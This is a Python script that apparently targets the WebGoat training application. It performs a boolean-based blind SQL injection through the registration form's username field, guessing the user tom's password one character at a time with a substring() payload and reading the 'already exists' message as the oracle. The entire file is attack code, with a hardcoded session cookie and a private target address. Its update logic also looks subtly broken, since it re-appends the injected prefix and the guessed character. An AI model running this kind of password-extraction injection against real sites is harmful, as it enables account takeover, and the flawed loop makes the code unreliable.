import requests
import json
from string import digits, ascii_letters

user_num = 24
user_end = ") = 'thisisasecretfortomonly"

base_url = "http://10.1.121.141:8080/WebGoat/SqlInjection/challenge"
cookie = {"JSESSIONID":"4E3A95CF68081F9D672F6798F7E46C19"}
file_name = "try.html"
user_begin = "tom' AND substring(password, 1, "
email = '1234546@qq.com'
password = '123456'
test_set = digits + ascii_letters

if __name__ == "__main__":
    
    url = base_url
    
    for i in test_set:
        username_tmp = user_begin + str(user_num) + user_end + i
        params = {
            'username_reg': username_tmp, 
            'email_reg': email, 
            'password_reg': password, 
            'confirm_password_reg': password
        }
        # json1 = json.dumps(params)
        r = requests.put(url, cookies=cookie, data=params)
        result_json = r.json()
        feedback = str(result_json['feedback']).strip()
        check = ("User " + username_tmp + 
        " already exists please try to register with a different username.")
        if (feedback == check):
            user_end = username_tmp + i
            print(feedback)
            break
        else:
            print(i, end="")
            continue
    else:
        print(user_end)